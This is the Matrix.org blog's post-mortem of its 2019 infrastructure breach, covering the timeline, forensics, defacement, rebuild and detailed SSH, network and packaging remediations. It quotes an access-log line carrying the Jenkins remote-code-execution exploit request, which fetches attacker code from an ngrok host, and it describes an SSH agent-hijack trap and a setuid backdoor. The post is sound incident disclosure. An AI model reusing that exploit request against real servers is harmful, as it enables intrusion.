<p>Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.</p>
<p>Lots of stuff then happened over the following months - we <a href="https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/">secured funding</a> in Jan 2018; the French Government began talking about <a href="https://matrix.org/blog/2018/04/26/matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app/">switching to Matrix</a> around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).</p>
<p>Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out <a href="https://modular.im">Modular.im</a> as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).</p>
<p>So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the <a href="https://fastjetperformance.com/podcasts/how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance/">normalisation of deviance</a> - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.</p>
<h3 id="the-incident">The Incident</h3>
<p>The first evidence of things going wrong was a tweet from <a href="https://twitter.com/JaikeySarraf">JaikeySarraf</a>, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.</p>
<p>In this process, we spotted an unrecognised SSH key in <code>/root/.ssh/authorized_keys2</code> on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure <code>authorized_keys2</code> file (a legacy location from back when OpenSSH transitioned from <a href="https://searchsecurity.techtarget.com/tip/An-introduction-to-SSH2">SSH1-&gt;SSH2</a>).  Further inspection showed that 19 hosts in total had the same key present in the same place.</p>
<p>At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:</p>
<ul>
<li>The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - <a href="https://www.exploit-db.com/exploits/46572">https://www.exploit-db.com/exploits/46572</a>):</li>
</ul>
<p><code>matrix.org:443 151.34.xxx.xxx - - [13/Mar/2019:18:46:07 +0000] &quot;GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://5f36xxxx.ngrok.io/jenkins/%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP/1.1&quot; 500 6083 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;</code></p>
<ul>
<li>This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.</li>
<li>On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.</li>
<li>From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at <code>/usr/share/bsd-mail/shroot</code>).</li>
<li>The majority of access to the hosts occurred between Apr 4th and 6th.</li>
<li>There was no evidence of large-scale data exfiltration, based on analysing network logs.</li>
<li>There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).</li>
<li>There was no evidence of the identity server databases having been compromised.</li>
<li>There was no evidence of tampering in our source code repositories.</li>
<li>There was no evidence of tampering of our distributed software packages.</li>
<li>Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.</li>
</ul>
<p>By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.</p>
<p>We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial <a href="https://matrix.org/blog/2019/04/11/security-incident/">security incident blog post</a>. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).</p>
<p>Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.</p>
<p>At about 4am we had enough of the bare necessities back up and running to pause for sleep.</p>
<h3 id="the-defacement">The Defacement</h3>
<p>At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per <a href="https://github.com/vector-im/riot-web/issues/9435">https://github.com/vector-im/riot-web/issues/9435</a>). It looks like the attacker didn’t think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn’t yet been fully restored and the normal paging infrastructure wasn’t back up (we now have emergency-emergency-paging for this eventuality).</p>
<p>On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...</p>
<p><img src="/blog/img/cf.png" alt="Cloudflare login UI" /></p>
<p>...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the <a href="https://support.cloudflare.com/hc/en-us/articles/221318707-How-do-I-change-my-Global-API-Key-">Change API Key</a> button.</p>
<p>Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we’d rotated the admin API key, but we hadn’t, thus accidentally enabling the defacement.</p>
<p>To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.</p>
<h3 id="the-rebuild">The Rebuild</h3>
<p>The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:</p>
<ul>
<li>Access via SSH restricted as heavily as possible</li>
<li>SSH agent forwarding disabled server-side</li>
<li>All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.</li>
</ul>
<p>Then, whilst reinstating services on the new infra, we opted to review <strong>everything</strong> being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:</p>
<ul>
<li>Jenkins has been replaced by <a href="https://buildkite.com/matrix-dot-org">Buildkite</a></li>
<li>Wordpress has been replaced by static generated sites (e.g. <a href="https://github.com/matrix-org/matrix.org/tree/master/gatsby">Gatsby</a>)</li>
<li>cgit has been replaced by <a href="https://gitlab.matrix.org">gitlab</a>.</li>
<li>Entirely new packaging building, signing &amp; distribution infrastructure (more on that later)</li>
<li>etc.</li>
</ul>
<p>Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.</p>
<p>In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:</p>
<p><img src="/blog/img/services.png" alt="Service status" /></p>
<p>Apologies again that it took longer to get some of these services back up than we’d preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, <a href="https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a/">other security work</a>, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.</p>
<h3 id="remediations">Remediations</h3>
<p>Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.</p>
<p>We’d like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we’re going to have to skip over some of the items, however - after all, remediations imply that there’s something that could be improved, and for obvious reasons we don’t want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.</p>
<p>We should also acknowledge that after being removed from the infra, the attacker chose to file a <a href="https://github.com/matrix-org/matrix.org/issues/371">set of Github issues</a> on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.</p>
<p>We’ve split the remediation work into the following domains.</p>
<h4 id="ssh">SSH</h4>
<p>Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:</p>
<h5 id="ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</h5>
<p>SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.</p>
<p>The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, <a href="https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding">Github’s guide to using SSH agent forwarding</a> says: </p>
<blockquote>
<p><strong>Warning</strong>: You may be tempted to use a wildcard like <code>Host *</code> to just apply this setting (ForwardAgent: yes) to all SSH connections. That's not really a good idea, as you'd be sharing your local SSH keys with <em>every</em> server you SSH into. They won't have direct access to the keys, but they will be able to use them <em>as you</em> while the connection is established. <strong>You should only add servers you trust and that you intend to use with agent forwarding</strong></p>
</blockquote>
<p>As a result, several of the team doing ops work had set <code>Host *.matrix.org ForwardAgent: yes</code> in their ssh client configs, thinking “well, what <em>can</em> we trust if not our own servers?”</p>
<p>This was a massive, massive mistake.</p>
<p>If there is one lesson everyone should learn from this whole mess, it is: <strong>SSH agent forwarding is incredibly unsafe, and in general you should never use it.</strong>  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and <em>boom</em>, even if it was just a one-off <code>ssh -A</code>.</p>
<p>Our remediations for this are:</p>
<ul>
<li>Disable all ssh agent forwarding on the servers.</li>
<li>If you need to jump through a box to ssh into another box, use <code>ssh -J $host</code>.</li>
<li>This can also be used with rsync via <code>rsync -e &quot;ssh -J $host&quot;</code></li>
<li>If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s <a href="https://www.openssh.com/txt/release-8.0">release notes</a> explicitly recommends using more modern protocols than scp).</li>
<li>If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.</li>
<li>If you just need to check out stuff from public git repos, use https rather than git+ssh.</li>
<li>Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...</li>
</ul>
<p>Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via <code>ssh-add -c</code>, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.</p>
<h5 id="ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</h5>
<p>Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.</p>
<h5 id="ssh-keys-should-give-minimal-access">SSH keys should give minimal access</h5>
<p>Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.</p>
<p>A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new <a href="https://matrix.org/blog">matrix.org blog</a> is continuously deployed into production by Buildkite from <a href="https://github.com/matrix-org/matrix.org">GitHub</a> without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We’ve already been experimenting internally with sentry for this.</p>
<p>Relatedly, we’ve also shifted to requiring multiple SSH keys per user (per device, and for privileged / unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn’t help prevent the attack, it did assist with forensics).</p>
<h5 id="two-factor-authentication">Two factor authentication</h5>
<p>We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.</p>
<h5 id="it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</h5>
<p>We’ve decided to stop users from being able to directly manage their own SSH keys in production via <code>~/.ssh/authorized_keys</code> (or <code>~/.ssh/authorized_keys2</code> for that matter) - we can see no benefit from letting non-root users set keys.</p>
<p>Instead, keys for all accounts are managed exclusively by Ansible via <code>/etc/ssh/authorized_keys/$account</code> (using sshd’s <code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u</code> directive).</p>
<h5 id="changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</h5>
<p>If we’d had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.</p>
<p>Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).</p>
<h5 id="ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</h5>
<p>If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).</p>
<p>We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines. </p>
<h4 id="network-architecture">Network architecture</h4>
<p>As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.</p>
<p>We are addressing this by:</p>
<ul>
<li>Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
<ul>
<li>Development</li>
<li>Intranet</li>
<li>Package Build (airgapped; see below for more details)</li>
<li>Package Distribution</li>
<li>Production, which is in turn split per class of service.</li>
</ul>
</li>
<li>Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.</li>
<li>Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).</li>
</ul>
<p>We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. </p>
<h4 id="keeping-patched">Keeping patched</h4>
<p>Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).</p>
<p>Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.</p>
<p>Aside from our infrastructure, we’re also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.</p>
<p>Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.</p>
<h4 id="intrusion-detection">Intrusion detection</h4>
<p>There’s obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we’re working on real-time log analysis for aberrant behaviour.</p>
<h4 id="incident-management">Incident management</h4>
<p>There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:</p>
<ul>
<li>The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)</li>
<li>The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.</li>
<li>The need to have an existing inventory of services and secrets available for tracking progress and prioritisation</li>
<li>The need to have a general incident management <a href="https://news.ycombinator.com/item?id=19682451&amp;p=2">checklist</a> for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
<ul>
<li>Remembering to appoint named incident manager, external comms manager &amp; internal comms manager. (They could of course be the same person, but the roles are distinct).</li>
<li>Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff</li>
<li>Remembering to informing the ICO (Information Commissioner Office) of any user data breaches</li>
<li>Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)</li>
<li>Reminders to snapshot systems for forensics &amp; backups</li>
<li>Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.</li>
<li>Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)</li>
</ul>
</li>
</ul>
<h4 id="configuration-management">Configuration management</h4>
<p>One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.</p>
<p>This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.</p>
<p>Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It’s unfortunate that we had already done the work for this (and even had been <a href="https://github.com/ansible-community/ansible-london-meetup/blob/master/presentations/2019-01-31/Introducing%20Ansible%20to%20matrix-final.pdf">giving talks at Ansible meetups</a> about it!) but had not yet applied it to the legacy infrastructure.</p>
<h4 id="avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</h4>
<p>None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.</p>
<h4 id="secure-packaging">Secure packaging</h4>
<p>One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot/Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.</p>
<p>Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot/Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot/Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot/Android and <a href="https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739">started over</a>.  (If you want to give the newly released app a fighting chance despite this setback, feel free to <a href="https://play.google.com/store/apps/details?id=im.vector.app&amp;showAllReviews=true">give it some stars</a> on the Play Store). We also revoked the compromised Synapse &amp; Riot GPG keys and created new ones (and published <a href="https://github.com/matrix-org/synapse/commit/95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1">new instructions</a> for how to securely set up your Synapse or Riot debian repos).</p>
<p>In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:</p>
<ul>
<li>Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).</li>
<li>We then perform all releases from a dedicated isolated release terminal.
<ul>
<li>This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.</li>
<li>Needless to say, the device is strictly used for <em>nothing</em> other than performing releases.</li>
<li>The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)</li>
<li>The signing keys (hardware or software) are kept exclusively on this device.</li>
<li>The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.</li>
<li>We physically store the device securely.</li>
<li>We ensure someone on the team always has physical access to it in order to do emergency builds.</li>
</ul>
</li>
<li>Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
<ul>
<li>These live at <a href="https://packages.matrix.org">https://packages.matrix.org</a> and <a href="https://packages.riot.im">https://packages.riot.im</a></li>
<li>These are minimal machines with nothing but a static web-server.</li>
<li>They are accessed only via the dedicated SSH keys stored on the release terminal.</li>
<li>These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s <a href="https://www.cloudflare.com/always-online/">always online</a> feature, for better or worse).</li>
</ul>
</li>
</ul>
<p>Alternatives here included:</p>
<ul>
<li>In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.</li>
<li>We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per <a href="https://github.com/matrix-org/matrix.org/issues/370">https://github.com/matrix-org/matrix.org/issues/370</a>).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.</li>
</ul>
<h4 id="dev-and-ci-infrastructure">Dev and CI infrastructure</h4>
<p>The main change in our dev and CI infrastructure is to move from Jenkins to <a href="https://buildkite.com/matrix-dot-org">Buildkite</a>.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.</p>
<p>The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. <a href="riot.im/develop">riot.im/develop</a>), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.</p>
<p>Other than CI, our strategy is:</p>
<ul>
<li>Continue using Github for public repositories</li>
<li>Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like <a href="https://gitlab.matrix.org/matrix-org/olm">Olm</a>)</li>
<li>Continue to host docker images on Docker Hub (despite their recent <a href="https://success.docker.com/article/docker-hub-user-notification">security dramas</a>).</li>
</ul>
<h4 id="log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</h4>
<p>Another thing that the breach made painfully clear is that we log too much.  While there’s not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we’ve kept logging on matrix.org relatively verbose to help with debugging.  There’s nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn’t pick it up.</p>
<p>However, we can still improve our logging and PII-handling substantially:</p>
<ul>
<li>Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).</li>
<li>Minimising log retention to the bare minimum we need to investigate recent issues and abuse</li>
<li>Ensuring that PII is stored hashed wherever possible.</li>
</ul>
<p>Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our <a href="https://github.com/vector-im/policies/tree/master/docs/matrix-org">privacy policies</a> and <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix/">GDPR work</a>), but there is also more we can do, particularly:</p>
<ul>
<li>Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is <a href="https://github.com/vector-im/riot-web/issues/6779">https://github.com/vector-im/riot-web/issues/6779</a>.</li>
<li>We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is <a href="https://github.com/matrix-org/synapse/issues/5145">https://github.com/matrix-org/synapse/issues/5145</a></li>
<li>We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is <a href="https://github.com/matrix-org/matrix-doc/pull/1763">https://github.com/matrix-org/matrix-doc/pull/1763</a></li>
<li>We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is <a href="https://github.com/matrix-org/matrix-doc/pull/1228">https://github.com/matrix-org/matrix-doc/pull/1228</a>.</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.</p>
<p>Again, we’d like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We’d also like to particularly thank <a href="https://www.linkedin.com/in/kade-morton-34179283/">Kade Morton</a> for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.</p>
<p>On which note, we’re going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX/Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.</p>
<p><i>Given the new blog doesn't have comments yet, feel free to discuss the post over at <a href="https://news.ycombinator.com/item?id=19857744">HN</a>.</i></p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a&#x2F;" title="Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a">Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</a></h2>
                <span>
                    03.05.2019 00:00
                    —
                    <a href="/category/general">
                        General
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Over the last few weeks we’ve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.</p>
<p>We’ve also set up an official <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a> to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail <a href="mailto:security@matrix.org">security@matrix.org</a> to remind us if we’ve forgotten you!).</p>
<p>Since we published the Hall of Fame yesterday, we’ve already been getting new entries and so we’re doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we’re running late in publishing the post mortem of the <a href="https://matrix.org/blog/2019/04/11/security-incident">Apr 11 security incident</a> - we are trying to get that out as soon as we can.</p>
<h2 id="sydent-1-0-3">Sydent 1.0.3</h2>
<p>Sydent 1.0.3 has three security fixes:</p>
<ul>
<li>Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing the issue!</li>
